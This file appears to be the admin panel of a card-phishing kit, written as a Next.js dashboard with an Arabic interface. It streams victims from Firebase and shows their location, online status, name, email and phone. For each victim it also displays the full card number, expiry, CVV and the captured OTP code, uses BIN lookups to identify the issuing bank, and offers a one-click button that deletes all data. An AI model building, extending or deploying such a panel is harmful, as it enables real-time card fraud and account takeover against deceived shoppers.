"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import {
  RefreshCw,
  LogOut,
  CreditCard,
  User,
  Clock,
  MapPin,
  Phone,
  Mail,
  Check,
  X,
  Inbox,
  Circle,
  EyeOff,
  Eye,
  Shield,
  Wifi,
  Building2,
  Globe,
  Activity,
  Users,
  Trash2,
} from "lucide-react"
import {
  subscribeToVisitors,
  subscribeToFormSubmissions,
  getOnlineVisitorsCount,
  deleteAllData,
  type VisitorData,
  type FormSubmission,
} from "@/lib/firebase"
import { useAuth } from "@/context/AuthContext"
import { Button } from "@/components/ui/button"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Badge } from "@/components/ui/badge"

interface CombinedData {
  visitorId: string
  country: string
  city: string
  isOnline: boolean
  currentPage: string
  lastSeen: any
  buyerInfo: Record<string, any> | null
  paymentInfo: Record<string, any> | null
  paymentSuccess: boolean
  code: string
}

interface BinInfo {
  scheme: string
  type: string
  brand: string
  bank: {
    name: string
    url?: string
    phone?: string
    city?: string
  }
  country: {
    name: string
    emoji?: string
    currency?: string
    alpha2?: string
  }
}

const lookupBin = async (cardNumber: string): Promise<BinInfo | null> => {
  try {
    const bin = cardNumber.replace(/\s/g, "").substring(0, 6)
    if (bin.length < 6) return null

    const response = await fetch("/api/bin-lookup", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ bin }),
    })

    if (!response.ok) return null
    const data = await response.json()

    if (data.BIN) {
      return {
        scheme: data.BIN.scheme || "",
        type: data.BIN.type || "",
        brand: data.BIN.brand || "",
        bank: {
          name: data.BIN.issuer?.name || "",
          url: data.BIN.issuer?.website || "",
          phone: data.BIN.issuer?.phone || "",
          city: "",
        },
        country: {
          name: data.BIN.country?.country || "",
          emoji: "",
          currency: data.BIN.currency || "",
          alpha2: data.BIN.country?.alpha2 || "",
        },
      }
    }
    return null
  } catch (error) {
    console.error("BIN lookup failed:", error)
    return null
  }
}

function getCountryFlag(countryCode: string): string {
  const codePoints = countryCode
    .toUpperCase()
    .split("")
    .map((char) => 127397 + char.charCodeAt(0))
  return String.fromCodePoint(...codePoints)
}

const countryNamesArabic: Record<string, string> = {
  "United States": "الولايات المتحدة",
  "United Kingdom": "المملكة المتحدة",
  "Saudi Arabia": "المملكة العربية السعودية",
  "United Arab Emirates": "الإمارات العربية المتحدة",
  Qatar: "قطر",
  Kuwait: "الكويت",
  Bahrain: "البحرين",
  Oman: "عُمان",
  Egypt: "مصر",
  Jordan: "الأردن",
  Lebanon: "لبنان",
  Iraq: "العراق",
  Syria: "سوريا",
  Palestine: "فلسطين",
  Morocco: "المغرب",
  Algeria: "الجزائر",
  Tunisia: "تونس",
  Libya: "ليبيا",
  Sudan: "السودان",
  Yemen: "اليمن",
  Germany: "ألمانيا",
  France: "فرنسا",
  Italy: "إيطاليا",
  Spain: "إسبانيا",
  Netherlands: "هولندا",
  Turkey: "تركيا",
  Russia: "روسيا",
  China: "الصين",
  Japan: "اليابان",
  India: "الهند",
  Pakistan: "باكستان",
  Indonesia: "إندونيسيا",
  Malaysia: "ماليزيا",
  Canada: "كندا",
  Brazil: "البرازيل",
  Australia: "أستراليا",
}

function translateCountryName(englishName: string): string {
  return countryNamesArabic[englishName] || englishName
}

function PremiumCreditCard({
  paymentInfo,
  binInfo,
}: {
  paymentInfo: Record<string, any>
  binInfo: any
}) {
  const cardNumber = paymentInfo.cardLast4 || ""
  const formattedNumber = cardNumber
    .replace(/\s/g, "")
    .replace(/(.{4})/g, "$1 ")
    .trim()

  const getCardGradient = () => {
    const scheme = binInfo?.scheme?.toLowerCase()
    if (scheme === "visa") return "from-[#1a1f71] via-[#2557d6] to-[#1a1f71]"
    if (scheme === "mastercard") return "from-[#cc2131] via-[#eb001b] to-[#f79e1b]"
    if (scheme === "amex") return "from-[#006fcf] via-[#00aeef] to-[#006fcf]"
    return "from-slate-700 via-slate-800 to-slate-900"
  }

  const getCardLogo = () => {
    const scheme = binInfo?.scheme?.toLowerCase()
    if (scheme === "visa") {
      return <div className="text-white font-bold text-xl italic tracking-wider">VISA</div>
    }
    if (scheme === "mastercard") {
      return (
        <div className="flex items-center -space-x-2">
          <div className="w-7 h-7 bg-red-500 rounded-full opacity-90"></div>
          <div className="w-7 h-7 bg-yellow-400 rounded-full opacity-90"></div>
        </div>
      )
    }
    if (scheme === "amex") {
      return <div className="text-white font-bold text-lg">AMEX</div>
    }
    return <CreditCard className="w-7 h-7 text-white/60" />
  }

  return (
    <div className="space-y-4">
      <div
        className={`w-full aspect-[1.6/1] max-w-sm rounded-2xl p-5 bg-gradient-to-br ${getCardGradient()} text-white shadow-2xl relative overflow-hidden`}
      >
        <div className="absolute top-0 right-0 w-40 h-40 bg-white/10 rounded-full blur-3xl -translate-y-1/2 translate-x-1/2"></div>
        <div className="absolute bottom-0 left-0 w-32 h-32 bg-white/5 rounded-full blur-2xl translate-y-1/2 -translate-x-1/2"></div>

        <div className="flex items-start justify-between mb-6 relative z-10">
          <div className="flex items-center gap-3">
            <div className="w-10 h-7 bg-gradient-to-br from-yellow-300 via-yellow-400 to-yellow-500 rounded-md shadow-inner">
              <div className="w-full h-full grid grid-cols-3 gap-0.5 p-1">
                {[...Array(6)].map((_, i) => (
                  <div key={i} className="bg-yellow-600/30 rounded-sm"></div>
                ))}
              </div>
            </div>
            <Wifi className="w-5 h-5 text-white/70 rotate-90" />
          </div>
          {getCardLogo()}
        </div>

        <div className="mb-5 relative z-10">
          <div className="font-mono text-xl tracking-[0.2em] font-medium drop-shadow-lg" dir="ltr">
            {formattedNumber || "•••• •••• •••• ••••"}
          </div>
        </div>

        <div className="flex items-end justify-between relative z-10">
          <div>
            <div className="text-white/50 text-[10px] uppercase tracking-wider mb-1">Card Holder</div>
            <div className="font-semibold text-sm uppercase tracking-wide truncate max-w-[140px]">
              {paymentInfo.cardholderName || "N/A"}
            </div>
          </div>
          <div className="flex gap-4 items-end">
            <div className="text-left" dir="ltr">
              <div className="text-white/50 text-[10px] uppercase tracking-wider mb-1">Valid Thru</div>
              <div className="font-mono text-sm font-medium">{paymentInfo.expiryDate || "MM/YY"}</div>
            </div>
            <div className="text-left" dir="ltr">
              <div className="text-white/50 text-[10px] uppercase tracking-wider mb-1">CVV</div>
              <div className="font-mono text-sm font-bold">{paymentInfo.cvv || "•••"}</div>
            </div>
          </div>
        </div>

        {binInfo && (
          <div className="flex items-center justify-between mt-4 pt-3 border-t border-white/20 relative z-10">
            <div className="flex items-center gap-2">
              <Badge variant="secondary" className="bg-white/20 text-white text-[10px] border-0">
                {binInfo.type || "CARD"}
              </Badge>
              {binInfo.brand && (
                <Badge variant="secondary" className="bg-white/10 text-white/80 text-[10px] border-0">
                  {binInfo.brand}
                </Badge>
              )}
            </div>
            {binInfo.country?.currency && (
              <Badge variant="secondary" className="bg-white/20 text-white text-[10px] border-0">
                {binInfo.country.currency}
              </Badge>
            )}
          </div>
        )}
      </div>
    </div>
  )
}

export default function AdminDashboard() {
  const router = useRouter()
  const { user, isLoading: authLoading, logout } = useAuth()
  const [visitors, setVisitors] = useState<VisitorData[]>([])
  const [formSubmissions, setFormSubmissions] = useState<FormSubmission[]>([])
  const [onlineCount, setOnlineCount] = useState(0)
  const [isLoading, setIsLoading] = useState(true)
  const [selectedData, setSelectedData] = useState<CombinedData | null>(null)
  const [binInfo, setBinInfo] = useState<BinInfo | null>(null)
  const [loadingBin, setLoadingBin] = useState(false)
  const [hiddenIds, setHiddenIds] = useState<Set<string>>(new Set())
  const [showHidden, setShowHidden] = useState(false)
  const [filter, setFilter] = useState<"all" | "online" | "withPayment" | "withBuyer" | "visitors">("all")
  const [isDeleting, setIsDeleting] = useState(false)
  const [showDeleteConfirm, setShowDeleteConfirm] = useState(false)

  const handleDeleteAll = async () => {
    setIsDeleting(true)
    const result = await deleteAllData()
    setIsDeleting(false)
    setShowDeleteConfirm(false)
    if (result.success) {
      setSelectedData(null)
      setVisitors([])
      setFormSubmissions([])
    }
  }

  useEffect(() => {
    if (!authLoading && !user) {
      router.push("/admin/login")
    }
  }, [user, authLoading, router])

  useEffect(() => {
    if (!user) return

    const unsubVisitors = subscribeToVisitors((data) => {
      setVisitors(data)
      setIsLoading(false)
    })

    const unsubForms = subscribeToFormSubmissions((data) => {
      setFormSubmissions(data)
    })

    const unsubOnline = getOnlineVisitorsCount((count) => {
      setOnlineCount(count)
    })

    return () => {
      unsubVisitors()
      unsubForms()
      unsubOnline()
    }
  }, [user])

  const formatTimeAgo = (timestamp: any) => {
    if (!timestamp) return ""
    const date = typeof timestamp === "number" ? new Date(timestamp) : new Date()
    const now = new Date()
    const diff = now.getTime() - date.getTime()
    const minutes = Math.floor(diff / 60000)
    const hours = Math.floor(diff / 3600000)

    if (minutes < 1) return "الآن"
    if (minutes < 60) return `${minutes}د`
    if (hours < 24) return `${hours}س`
    return `${Math.floor(diff / 86400000)}ي`
  }

  const formatFullTime = (timestamp: any) => {
    if (!timestamp) return "غير معروف"
    const date = typeof timestamp === "number" ? new Date(timestamp) : new Date()
    return date.toLocaleString("ar-SA", {
      year: "numeric",
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    })
  }

  const handleLogout = async () => {
    await logout()
    router.push("/admin/login")
  }

  const combinedData: CombinedData[] = visitors.map((visitor) => {
    const buyerSubmission = formSubmissions.find(
      (f) => f.visitorId === visitor.visitorId && f.formType === "buyer_details",
    )
    const paymentSubmission = formSubmissions.find(
      (f) => f.visitorId === visitor.visitorId && f.formType === "payment_attempt",
    )

    return {
      visitorId: visitor.visitorId,
      country: visitor.country || "Unknown",
      city: visitor.city || "",
      isOnline: visitor.isOnline || false,
      currentPage: visitor.currentPage || "الرئيسية",
      lastSeen: visitor.lastSeen,
      buyerInfo: buyerSubmission?.data || null,
      paymentInfo: paymentSubmission?.data || null,
      paymentSuccess: paymentSubmission?.success || false,
      code: paymentSubmission?.data?.otp || "",
    }
  })

  const sortedData = [...combinedData].sort((a, b) => {
    const dateA = typeof a.lastSeen === "number" ? a.lastSeen : 0
    const dateB = typeof b.lastSeen === "number" ? b.lastSeen : 0
    return dateB - dateA
  })

  const filteredData = sortedData.filter((row) => {
    if (!showHidden && hiddenIds.has(row.visitorId)) return false

    switch (filter) {
      case "online":
        return row.isOnline
      case "withPayment":
        return row.paymentInfo
      case "withBuyer":
        return row.buyerInfo
      case "visitors":
        return true
      case "all":
      default:
        return row.paymentInfo || row.buyerInfo
    }
  })

  const hiddenCount = combinedData.filter((row) => row.paymentInfo && hiddenIds.has(row.visitorId)).length

  useEffect(() => {
    if (selectedData) {
      const updated = combinedData.find((d) => d.visitorId === selectedData.visitorId)
      if (updated && JSON.stringify(updated) !== JSON.stringify(selectedData)) {
        setSelectedData(updated)
      }
    }
  }, [combinedData, selectedData])

  const handleHideEntry = (visitorId: string) => {
    setHiddenIds((prev) => {
      const newSet = new Set(prev)
      if (newSet.has(visitorId)) {
        newSet.delete(visitorId)
      } else {
        newSet.add(visitorId)
      }
      return newSet
    })
    if (selectedData?.visitorId === visitorId && !showHidden) {
      setSelectedData(null)
    }
  }

  const handleSelectEntry = async (data: CombinedData) => {
    setSelectedData(data)
    setBinInfo(null)

    if (data.paymentInfo?.cardLast4) {
      setLoadingBin(true)
      const info = await lookupBin(data.paymentInfo.cardLast4)
      setBinInfo(info)
      setLoadingBin(false)
    }
  }

  if (authLoading || isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-[#8A1538] to-[#a91d47] flex items-center justify-center mx-auto mb-4 shadow-xl">
            <RefreshCw className="w-8 h-8 text-white animate-spin" />
          </div>
          <p className="text-slate-400 text-lg">جاري التحميل...</p>
        </div>
      </div>
    )
  }

  if (!user) return null

  return (
    <div className="h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 flex flex-col" dir="rtl">
      <header className="bg-slate-900/80 backdrop-blur-xl border-b border-white/10 px-6 py-4 flex items-center justify-between gap-4 shrink-0">
        <div className="flex items-center gap-4">
          <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-[#8A1538] to-[#a91d47] flex items-center justify-center shadow-lg shadow-[#8A1538]/20">
            <Shield className="w-6 h-6 text-white" />
          </div>
          <div>
            <h1 className="text-xl font-bold text-white">لوحة التحكم</h1>
            <p className="text-sm text-slate-400">إدارة المعاملات والمستخدمين</p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <div className="hidden md:flex items-center gap-3">
            <div className="bg-white/5 backdrop-blur-sm rounded-xl px-4 py-2 border border-white/10">
              <div className="flex items-center gap-2">
                <Activity className="w-4 h-4 text-green-400" />
                <span className="text-xs text-slate-400">متصل</span>
                <span className="text-lg font-bold text-white">{onlineCount}</span>
              </div>
            </div>
            <div className="bg-white/5 backdrop-blur-sm rounded-xl px-4 py-2 border border-white/10">
              <div className="flex items-center gap-2">
                <Users className="w-4 h-4 text-blue-400" />
                <span className="text-xs text-slate-400">المعاملات</span>
                <span className="text-lg font-bold text-white">{filteredData.length}</span>
              </div>
            </div>
          </div>

          {hiddenCount > 0 && (
            <Button
              onClick={() => setShowHidden(!showHidden)}
              variant={showHidden ? "default" : "outline"}
              size="sm"
              className={
                showHidden ? "bg-[#8A1538] hover:bg-[#70102d]" : "border-white/20 text-slate-300 hover:bg-white/10"
              }
            >
              <EyeOff className="w-4 h-4 ml-1" />
              {hiddenCount}
            </Button>
          )}

          <Button
            onClick={() => setShowDeleteConfirm(true)}
            variant="destructive"
            size="sm"
            className="bg-red-600 hover:bg-red-700"
          >
            <Trash2 className="w-4 h-4 ml-1" />
            حذف الكل
          </Button>

          <Button
            onClick={handleLogout}
            variant="ghost"
            size="sm"
            className="text-slate-400 hover:text-white hover:bg-white/10"
          >
            <LogOut className="w-4 h-4" />
          </Button>
        </div>
      </header>

      {showDeleteConfirm && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-slate-800 rounded-2xl p-6 max-w-md w-full border border-white/10 shadow-2xl">
            <div className="flex items-center gap-3 mb-4">
              <div className="w-12 h-12 rounded-xl bg-red-500/20 flex items-center justify-center">
                <Trash2 className="w-6 h-6 text-red-400" />
              </div>
              <div>
                <h3 className="text-lg font-bold text-white">حذف جميع البيانات</h3>
                <p className="text-sm text-slate-400">هل أنت متأكد؟</p>
              </div>
            </div>
            <p className="text-slate-300 mb-6">
              سيتم حذف جميع الزوار والمعاملات والبيانات المسجلة. هذا الإجراء لا يمكن التراجع عنه.
            </p>
            <div className="flex gap-3">
              <Button
                onClick={() => setShowDeleteConfirm(false)}
                variant="outline"
                className="flex-1 border-white/20 text-slate-300 hover:bg-white/10"
                disabled={isDeleting}
              >
                إلغاء
              </Button>
              <Button
                onClick={handleDeleteAll}
                variant="destructive"
                className="flex-1 bg-red-600 hover:bg-red-700"
                disabled={isDeleting}
              >
                {isDeleting ? (
                  <>
                    <RefreshCw className="w-4 h-4 ml-1 animate-spin" />
                    جاري الحذف...
                  </>
                ) : (
                  <>
                    <Trash2 className="w-4 h-4 ml-1" />
                    حذف الكل
                  </>
                )}
              </Button>
            </div>
          </div>
        </div>
      )}

      <div className="flex-1 flex overflow-hidden">
        <div className="w-80 bg-slate-900/50 backdrop-blur-sm border-l border-white/10 flex flex-col">
          <div className="p-4 border-b border-white/10">
            <h2 className="text-sm font-semibold text-slate-300 flex items-center gap-2 mb-3">
              <Inbox className="w-4 h-4" />
              المعاملات الواردة
            </h2>
            <div className="flex flex-wrap gap-1">
              <Button
                size="sm"
                variant={filter === "all" ? "default" : "ghost"}
                onClick={() => setFilter("all")}
                className={`text-xs h-7 ${filter === "all" ? "bg-[#8A1538]" : "text-slate-400 hover:text-white"}`}
              >
                الكل
              </Button>
              <Button
                size="sm"
                variant={filter === "visitors" ? "default" : "ghost"}
                onClick={() => setFilter("visitors")}
                className={`text-xs h-7 ${filter === "visitors" ? "bg-[#8A1538]" : "text-slate-400 hover:text-white"}`}
              >
                <Users className="w-3 h-3 ml-1" />
                الزوار
              </Button>
              <Button
                size="sm"
                variant={filter === "online" ? "default" : "ghost"}
                onClick={() => setFilter("online")}
                className={`text-xs h-7 ${filter === "online" ? "bg-[#8A1538]" : "text-slate-400 hover:text-white"}`}
              >
                <Circle className="w-3 h-3 ml-1 text-green-400 fill-green-400" />
                متصل
              </Button>
              <Button
                size="sm"
                variant={filter === "withPayment" ? "default" : "ghost"}
                onClick={() => setFilter("withPayment")}
                className={`text-xs h-7 ${filter === "withPayment" ? "bg-[#8A1538]" : "text-slate-400 hover:text-white"}`}
              >
                <CreditCard className="w-3 h-3 ml-1" />
                مدفوعات
              </Button>
              <Button
                size="sm"
                variant={filter === "withBuyer" ? "default" : "ghost"}
                onClick={() => setFilter("withBuyer")}
                className={`text-xs h-7 ${filter === "withBuyer" ? "bg-[#8A1538]" : "text-slate-400 hover:text-white"}`}
              >
                <User className="w-3 h-3 ml-1" />
                بيانات المشترين
              </Button>
            </div>
          </div>

          <ScrollArea className="flex-1">
            <div className="p-2">
              {filteredData.length === 0 ? (
                <div className="text-center py-12 px-4">
                  <Inbox className="w-12 h-12 text-slate-600 mx-auto mb-3" />
                  <p className="text-slate-500 text-sm">لا توجد معاملات</p>
                </div>
              ) : (
                filteredData.map((row) => (
                  <button
                    key={row.visitorId}
                    onClick={() => handleSelectEntry(row)}
                    className={`w-full text-right p-3 rounded-xl mb-2 transition-all ${
                      selectedData?.visitorId === row.visitorId
                        ? "bg-[#8A1538] shadow-lg"
                        : "bg-white/5 hover:bg-white/10"
                    }`}
                  >
                    <div className="flex items-start justify-between mb-2">
                      <div className="flex items-center gap-2">
                        <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-slate-700 to-slate-800 flex items-center justify-center text-xs font-bold text-white">
                          {row.country.substring(0, 2)}
                        </div>
                        <div>
                          <p className="text-sm font-semibold text-white">{translateCountryName(row.country)}</p>
                          {row.city && <p className="text-xs text-slate-400">{row.city}</p>}
                        </div>
                      </div>
                      <div className="flex items-center gap-1">
                        {row.isOnline && <Circle className="w-2 h-2 text-green-400 fill-green-400" />}
                        <Clock className="w-3 h-3 text-slate-500" />
                        <span className="text-xs text-slate-400">{formatTimeAgo(row.lastSeen)}</span>
                      </div>
                    </div>
                    <div className="flex items-center gap-1 flex-wrap">
                      {row.paymentInfo && (
                        <Badge variant="secondary" className="bg-blue-500/20 text-blue-300 text-[10px] border-0">
                          <CreditCard className="w-3 h-3 ml-1" />
                          دفع
                        </Badge>
                      )}
                      {row.buyerInfo && (
                        <Badge variant="secondary" className="bg-purple-500/20 text-purple-300 text-[10px] border-0">
                          <User className="w-3 h-3 ml-1" />
                          مشتري
                        </Badge>
                      )}
                      {hiddenIds.has(row.visitorId) && (
                        <Badge variant="secondary" className="bg-slate-700 text-slate-300 text-[10px] border-0">
                          <EyeOff className="w-3 h-3 ml-1" />
                          مخفي
                        </Badge>
                      )}
                    </div>
                  </button>
                ))
              )}
            </div>
          </ScrollArea>
        </div>

        <div className="flex-1 flex items-center justify-center p-6">
          {selectedData ? (
            <ScrollArea className="h-full w-full">
              <div className="max-w-2xl mx-auto space-y-6">
                <div className="bg-slate-800/50 backdrop-blur-sm rounded-2xl p-6 border border-white/10">
                  <div className="flex items-center justify-between mb-6">
                    <h2 className="text-2xl font-bold text-white flex items-center gap-3">
                      <MapPin className="w-6 h-6 text-blue-400" />
                      معلومات الزائر
                    </h2>
                    <Button
                      onClick={() => handleHideEntry(selectedData.visitorId)}
                      variant="ghost"
                      size="sm"
                      className="text-slate-400 hover:text-white"
                    >
                      {hiddenIds.has(selectedData.visitorId) ? (
                        <>
                          <Eye className="w-4 h-4 ml-1" />
                          إظهار
                        </>
                      ) : (
                        <>
                          <EyeOff className="w-4 h-4 ml-1" />
                          إخفاء
                        </>
                      )}
                    </Button>
                  </div>

                  <div className="grid gap-4">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-xl bg-blue-500/20 flex items-center justify-center">
                        <Globe className="w-5 h-5 text-blue-400" />
                      </div>
                      <div>
                        <p className="text-xs text-slate-400">البلد</p>
                        <p className="text-sm font-semibold text-white">{translateCountryName(selectedData.country)}</p>
                      </div>
                    </div>

                    {selectedData.city && (
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-xl bg-purple-500/20 flex items-center justify-center">
                          <MapPin className="w-5 h-5 text-purple-400" />
                        </div>
                        <div>
                          <p className="text-xs text-slate-400">المدينة</p>
                          <p className="text-sm font-semibold text-white">{selectedData.city}</p>
                        </div>
                      </div>
                    )}

                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-xl bg-green-500/20 flex items-center justify-center">
                        {selectedData.isOnline ? (
                          <Circle className="w-5 h-5 text-green-400 fill-green-400" />
                        ) : (
                          <Circle className="w-5 h-5 text-slate-600" />
                        )}
                      </div>
                      <div>
                        <p className="text-xs text-slate-400">الحالة</p>
                        <p className="text-sm font-semibold text-white">
                          {selectedData.isOnline ? "متصل الآن" : "غير متصل"}
                        </p>
                      </div>
                    </div>

                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-xl bg-orange-500/20 flex items-center justify-center">
                        <Clock className="w-5 h-5 text-orange-400" />
                      </div>
                      <div>
                        <p className="text-xs text-slate-400">آخر ظهور</p>
                        <p className="text-sm font-semibold text-white">{formatFullTime(selectedData.lastSeen)}</p>
                      </div>
                    </div>
                  </div>
                </div>

                {selectedData.buyerInfo && (
                  <div className="bg-slate-800/50 backdrop-blur-sm rounded-2xl p-6 border border-white/10">
                    <h2 className="text-2xl font-bold text-white flex items-center gap-3 mb-6">
                      <User className="w-6 h-6 text-purple-400" />
                      بيانات المشتري
                    </h2>
                    <div className="grid gap-4">
                      {selectedData.buyerInfo.fullName && (
                        <div className="flex items-center gap-3">
                          <User className="w-5 h-5 text-slate-500" />
                          <div>
                            <p className="text-xs text-slate-400">الاسم الكامل</p>
                            <p className="text-sm font-semibold text-white">{selectedData.buyerInfo.fullName}</p>
                          </div>
                        </div>
                      )}
                      {selectedData.buyerInfo.email && (
                        <div className="flex items-center gap-3">
                          <Mail className="w-5 h-5 text-slate-500" />
                          <div>
                            <p className="text-xs text-slate-400">البريد الإلكتروني</p>
                            <p className="text-sm font-semibold text-white" dir="ltr">
                              {selectedData.buyerInfo.email}
                            </p>
                          </div>
                        </div>
                      )}
                      {selectedData.buyerInfo.phone && (
                        <div className="flex items-center gap-3">
                          <Phone className="w-5 h-5 text-slate-500" />
                          <div>
                            <p className="text-xs text-slate-400">رقم الهاتف</p>
                            <p className="text-sm font-semibold text-white" dir="ltr">
                              {selectedData.buyerInfo.phone}
                            </p>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                )}

                {selectedData.paymentInfo && (
                  <div className="bg-slate-800/50 backdrop-blur-sm rounded-2xl p-6 border border-white/10">
                    <h2 className="text-2xl font-bold text-white flex items-center gap-3 mb-6">
                      <CreditCard className="w-6 h-6 text-blue-400" />
                      معلومات الدفع
                    </h2>

                    {loadingBin ? (
                      <div className="flex items-center justify-center py-12">
                        <RefreshCw className="w-8 h-8 text-slate-400 animate-spin" />
                      </div>
                    ) : (
                      <PremiumCreditCard paymentInfo={selectedData.paymentInfo} binInfo={binInfo} />
                    )}

                    {binInfo && (
                      <div className="mt-6 p-4 bg-white/5 rounded-xl space-y-3">
                        <div className="flex items-center gap-3">
                          <Building2 className="w-5 h-5 text-slate-400" />
                          <div>
                            <p className="text-xs text-slate-400">البنك</p>
                            <p className="text-sm font-semibold text-white">{binInfo.bank.name || "غير معروف"}</p>
                          </div>
                        </div>
                        {binInfo.country?.name && (
                          <div className="flex items-center gap-3">
                            <Globe className="w-5 h-5 text-slate-400" />
                            <div>
                              <p className="text-xs text-slate-400">بلد الإصدار</p>
                              <p className="text-sm font-semibold text-white">
                                {translateCountryName(binInfo.country.name)}
                              </p>
                            </div>
                          </div>
                        )}
                      </div>
                    )}

                    {selectedData.code && (
                      <div className="mt-6 p-4 bg-green-500/20 rounded-xl border border-green-500/30">
                        <div className="flex items-center gap-3">
                          <div className="w-10 h-10 rounded-xl bg-green-500/30 flex items-center justify-center">
                            <Check className="w-5 h-5 text-green-400" />
                          </div>
                          <div>
                            <p className="text-xs text-green-300">رمز التحقق (OTP)</p>
                            <p className="text-2xl font-mono font-bold text-white" dir="ltr">
                              {selectedData.code}
                            </p>
                          </div>
                        </div>
                      </div>
                    )}

                    <div className="mt-4 flex items-center gap-2">
                      {selectedData.paymentSuccess ? (
                        <Badge className="bg-green-500/20 text-green-300 border-green-500/30">
                          <Check className="w-4 h-4 ml-1" />
                          دفع ناجح
                        </Badge>
                      ) : (
                        <Badge variant="destructive" className="bg-red-500/20 text-red-300 border-red-500/30">
                          <X className="w-4 h-4 ml-1" />
                          دفع فاشل
                        </Badge>
                      )}
                    </div>
                  </div>
                )}
              </div>
            </ScrollArea>
          ) : (
            <div className="text-center">
              <div className="w-20 h-20 rounded-2xl bg-white/5 flex items-center justify-center mx-auto mb-4">
                <Inbox className="w-10 h-10 text-slate-600" />
              </div>
              <h3 className="text-xl font-semibold text-white mb-2">اختر معاملة</h3>
              <p className="text-slate-400">حدد معاملة من القائمة لعرض التفاصيل</p>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
